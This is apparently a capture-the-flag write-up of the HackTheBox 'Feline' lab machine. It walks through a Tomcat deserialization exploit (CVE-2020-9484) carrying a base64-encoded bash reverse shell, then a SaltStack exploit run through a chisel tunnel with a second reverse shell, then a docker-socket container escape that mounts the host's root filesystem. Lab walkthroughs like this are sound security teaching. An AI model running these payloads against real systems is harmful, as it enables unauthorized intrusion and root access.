---
title: HackTheBox Feline
author: Marius Kimmina
date: 2021-03-08 14:10:00 +0800
categories: [CTF, HackTheBox]
tags: [docker, linux, tomcat]
published: true
---

## 0x0 Introduction
The first **hard** box that I have ever pwned, so lets dive right into it. This box involved a java deserialization attack to first get an inital foothold, once we are on it we use a known exploit in `saltstack` to become root of docker container, now you might wonder: Why would we want to become root of a docker-container? Well this docker container also had a miss configuration issue which then allowed us to mount files from the host system, such as the root.txt, into the container.
![image](/assets/images/feline/feline-pwn.png "Feline has been pwned")


## 0x1 How not to handle error messages

As always I start with an nmap scan, 

```
$ nmap -sC -sV -oN recon/nmap-default 10.10.10.205
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 08:24 GMT
Nmap scan report for feline.htb (10.10.10.205)
Host is up (0.39s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.27
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VirusBucket
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


if we look at the website, running on port 8080, we see that this is some kind of malware analysis engine, called Virusbucket, and that we can upload files. 

![image](/assets/images/feline/feline-virusbucket.png "Feline Virusbucket")

if we capture the HTTP request for the file-upload, you can use a proxy like burp or ZAP for this, then you will see this:

![image](/assets/images/feline/feline-file-upload.png "Feline Upload")

But if we replace the filename here with some nonsense, then we can error from the application in which it leaks the location that our files are being upload to:

![image](/assets/images/feline/feline-upload-error.png "Feline Upload Error")

Which is some really useful information because if we can find a way to interact with the files that we have uploaded, through a tomcat vulnerability for example, then we need to know where to look for our uploaded files.

## 0x2 Cuz there is always a tomcat vulnerability

Since it's tomcat and we now that it's version 9.0.27 I, like most people solving this box probably, looked for a vulnerability in that found this blogpost: https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/ and the CVE in question is: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484.  
If you are solving this box after it has retired and are following along with this post of mine I highly suggest that you go and read the "redtimmy" post, it was well written and to the point. 
The whole point of this exploit is that, if we can get a serialized object on the disk, which we can by simply uploading it, we can use a path traversal vulnerability in the Session-Cookie to get tomcat to deserialize it, which in turn can give us code execution on the box.  
Since we know that our upload files go to `/opt/samples/uploads/` we can set our `JSESSIONID` to `../../../../../../../opt/samples/uploads/the-file-that-we-have-uploaded`  
To create such a serailized object we use `ysoserial` which you can find here: https://github.com/frohoff/ysoserial  
The error message of the File upload had also told us that this uses apache.org.commons which is a libarry for all sorts of common deserializations. Knowing that we can use `ysoserial` with the `CommonCollections4`.  

First we create our reverse shell command and encode it with base64 to avoid spacing errors

```
echo 'bash -i >& /dev/tcp/tun0/4141 0>&1' | base64
```
Then we use ysoserial to prepare our exploit, notice that we use the {} bash syntax to, again, avoid spaces.
```
java -jar ysoserial.jar CommonsCollections4 "bash -c {echo,ZWNobyAnYmFzaCAtaSA+JiAvZGV2L3RjcC90dW4wLzQxNDEgMD4mMSc=}|{base64,-d}|{bash,-i}" > exploit.session
```

Upload the file either through the website or by using `curl`

```
curl 'http://10.10.10.205:8080/upload.jsp' -F "image=@exploit.session"
```

and use netcat to listen for incomming connections:

```
nc -lvnp 9009
listening on [any] 9009 ...
```

Now send another request with the malformed cookie to execute the payload

```
curl 'http://10.10.10.205:8080/upload.jsp' -H "Cookie: JSESSIONID=../../../../../../opt/samples/uploads/exploit"
```

## 0x3 Why so salty?

Now that we are on the host we discover that port 4005 and 4006 are open, these ports are, by default, used by saltstack. Saltstack is an infrastructure management software but for this box we don't need to know much about how it acctually works. What we do need to know though is that there was a very recent vulnerabily in it. If you wanna read more details about the vulnerability you can go here: https://www.helpnetsecurity.com/2020/05/04/saltstack-salt-vulnerabilities/  
Otherwise we are going straight to the exploit which can be found here: https://www.exploit-db.com/exploits/48421  
If we are gonna try to run this on the victim maschine we are going to run into an issue, which is that the `salt` python module is not installed on the box. 

```
$ python3 exploit.py 
Traceback (most recent call last):
  File "exploit.py", line 16, in <module>
    import salt
ModuleNotFoundError: No module named 'salt'
```

## 0x4 Port forwarding to the rescue

So since the saltstack ports are on only listening on localhost, we cannot use the exploit from our box directly but since we are already on the box we can use a programm called `chisel` to do port forwarding and thus make the saltstack accessible from our host maschine.  
First, to get chisel on the victim maschine, go download it from https://github.com/jpillora/chisel/releases and then you can simply use the python http server to transfer it to the box.

```
$ python3 -m http.server
```

Use wget to download chisel on the victim maschine.

```
$ wget http://10.10.16.11:8000/chisel
```

Now we forward some ports as follows:

```
./chisel client 10.10.16.11:5566 R:4506:127.0.0.1:4506
```

and 

```
./chisel server -p 5566 --reverse
```

And now we can use the exploit on our own maschine against localhost, this will then be forwarded to the victim. We want to get a new shell here so lets first setup netcat again

```
nc -lvnp 5577
```

With that running we can finally use the exploit and get a new shell on the box.

```
python3 exploit.py --master 127.0.0.1 --exec 'bash -c "bash -i >& /dev/tcp/10.10.14.43/5577 0>&1"'
```

If everything has worked correctly here, we are `root`, yay! But it's still to early to celebrate, because we are root on a docker container, not the box itself. So we went from being a normal user on the box, to being root in docker container. That would under normal circumstances be considered a downgrade since being root of the container does not give us any more access but let's see...

## 0x5 The great docker escape

The first thing I noticed inside this container was a file called "todo.txt" inside the home directroy of the root user 

```
cat todo.txt
- Add saltstack support to auto-spawn sandbox dockers through events.
- Integrate changes to tomcat and make the service open to public.
```

On top of that I also noticed that the history file was not empty, it contained a lot of commands but one seemed particullarly interessting to me:

```
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
```

If I go ahead and run this one myself we get the following output:

```
root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
<t /var/run/docker.sock http://localhost/images/json
[{"Containers":-1,"Created":1590787186,"Id":"sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e","Labels":null,"ParentId":"","RepoDigests":null,"RepoTags":["sandbox:latest"],"SharedSize":-1,"Size":5574537,"VirtualSize":5574537},{"Containers":-1,"Created":1588544489,"Id":"sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9","Labels":null,"ParentId":"","RepoDigests":["<none>@<none>"],"RepoTags":["<none>:<none>"],"SharedSize":-1,"Size":1056679100,"VirtualSize":1056679100}]
```

From that we know that the container we are in is called `sandbox`. We are now able to copy the docker binary from the victim maschine into the docker-container. With our tomcat shell on the box we execute the following commands:

```
cd tmp
cp /usr/bin/docker .
python3 -m http.server 9009
```

Next, in the docker-container we download the docker-binary and make it executeable:

```
wget http://172.17.0.1:9001/docker
chmod +x docker
```

With this we can copy contents from the victim maschine into the docker-container using the following command (inside docker):

```
./docker run -v /:root/:root -it sandbox
```

And we are done, we are now able to access the root flag with a simple `cat root/root.txt`

## 0x6 Closing Words

This was the first `hard` box that I have ever owned and I learned a lot from it, the privilege escalation from normal user to root of docker container was a nice twist that we have never before seen on any other box (as far as I know) and I learned a lot from that. My respect to the creators of this awesome challenge.




